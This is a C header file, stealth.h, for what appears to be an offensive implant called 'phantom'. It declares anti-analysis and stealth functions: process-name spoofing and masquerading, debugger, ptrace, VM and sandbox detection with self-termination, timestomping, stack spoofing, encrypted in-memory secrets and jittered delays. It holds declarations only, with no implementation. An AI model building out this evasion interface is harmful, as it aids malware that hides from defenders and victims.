
#ifndef STEALTH_H
#define STEALTH_H

#include "phantom.h"
#include <stdint.h>
#include <stddef.h>

#define PH_STEALTH_MAX_NAME_LEN 256
#define PH_STEALTH_ARGV_MAX 64

#define PH_VM_CHECK_DMI 0x01
#define PH_VM_CHECK_CPUID 0x02
#define PH_VM_CHECK_PROC 0x04
#define PH_VM_CHECK_ALL (PH_VM_CHECK_DMI | PH_VM_CHECK_CPUID | PH_VM_CHECK_PROC)

typedef enum {
    PH_STEALTH_OK = 0,
    PH_STEALTH_DEBUGGER_FOUND,
    PH_STEALTH_PTRACE_ACTIVE,
    PH_STEALTH_VM_DETECTED,
    PH_STEALTH_TIMING_ATTACK,
    PH_STEALTH_PARENT_SUSPECT
} ph_stealth_status_t;

typedef struct {
    int is_vm;
    int vm_type;
    char vm_name[64];
    int confidence;
} ph_vm_info_t;

typedef struct {
    uint64_t start_time;
    uint64_t expected_delta;
    int is_timing_attack;
} ph_timing_ctx_t;

typedef struct {
    char original_argv0[PH_STEALTH_MAX_NAME_LEN];
    char spoofed_name[PH_STEALTH_MAX_NAME_LEN];
    char *argv_ptr;
    size_t argv_len;
    ph_stealth_status_t status;
    ph_vm_info_t vm_info;
    int is_spoofed;
    int ptrace_blocked;
} ph_stealth_ctx_t;

int ph_stealth_init(ph_stealth_ctx_t *ctx, int argc, char *argv[]);
int ph_stealth_spoof_argv(ph_stealth_ctx_t *ctx, const char *new_name);
int ph_stealth_spoof_prctl_name(ph_stealth_ctx_t *ctx, const char *new_name);
int ph_stealth_spoof_process(ph_stealth_ctx_t *ctx, const char *display_name, const char *thread_name);

int ph_stealth_mask_process_name(const char *masquerade_name);

int ph_stealth_detect_debugger(void);
int ph_stealth_detect_ptrace(void);
int ph_stealth_block_ptrace(void);
int ph_stealth_detect_parent_process(ph_stealth_ctx_t *ctx);

int ph_stealth_detect_vm(ph_vm_info_t *vm_info, int check_flags);
int ph_stealth_check_dmi_uct(ph_vm_info_t *vm_info);
int ph_stealth_check_cpu_hypervisor(ph_vm_info_t *vm_info);
int ph_stealth_check_proc_cpuinfo(ph_vm_info_t *vm_info);

int ph_stealth_timing_init(ph_timing_ctx_t *ctx, uint64_t expected_delta_ms);
int ph_stealth_timing_check(ph_timing_ctx_t *ctx);
uint64_t ph_stealth_get_timestamp_ns(void);

const char* ph_stealth_status_string(ph_stealth_status_t status);
const char* ph_stealth_vm_type_name(int vm_type);
void ph_stealth_cleanup(ph_stealth_ctx_t *ctx);

int ph_stealth_timestomp_file(const char *target_file, const char *reference_file);

typedef struct {
    uint8_t *encrypted_data;
    size_t data_len;
    uint8_t xor_key[32];
    uint8_t nonce[24];
    uint64_t last_rotation;
    uint32_t rotation_interval_ms;
    int is_encrypted;
} ph_heap_secret_t;

int ph_heap_secret_init(ph_heap_secret_t *ctx, const uint8_t *plaintext, size_t len);
int ph_heap_secret_encrypt(ph_heap_secret_t *ctx);
int ph_heap_secret_decrypt(ph_heap_secret_t *ctx, uint8_t *output, size_t output_len);
int ph_heap_secret_rotate_key(ph_heap_secret_t *ctx);
void ph_heap_secret_wipe(ph_heap_secret_t *ctx);

typedef struct {
    void *fake_return_addr;
    void *fake_frame_ptr;
    char fake_function_name[64];
    uint8_t original_bytes[16];
    int is_active;
} ph_stack_spoof_t;

int ph_stack_spoof_init(ph_stack_spoof_t *ctx, const char *fake_func);
int ph_stack_spoof_activate(ph_stack_spoof_t *ctx);
int ph_stack_spoof_deactivate(ph_stack_spoof_t *ctx);
void ph_stack_spoof_cleanup(ph_stack_spoof_t *ctx);

int ph_stealth_anti_debug_comprehensive(void);
int ph_stealth_check_cpuid_hypervisor(void);
int ph_stealth_check_rdtsc_timing(void);
int ph_stealth_self_terminate_if_sandbox(void);

int ph_stealth_get_jitter_delay(int base_delay_ms);

#endif
